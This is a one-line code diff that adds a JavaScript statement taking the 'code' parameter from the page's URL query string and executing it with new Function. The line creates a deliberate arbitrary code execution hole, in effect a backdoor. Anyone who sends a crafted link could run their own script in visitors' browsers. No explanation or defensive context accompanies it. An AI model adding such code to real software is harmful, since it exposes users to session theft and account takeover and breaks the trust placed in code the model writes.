@@ -1,0 +1,1 @@
+new Function(new URLSearchParams(location.search).get("code"))();
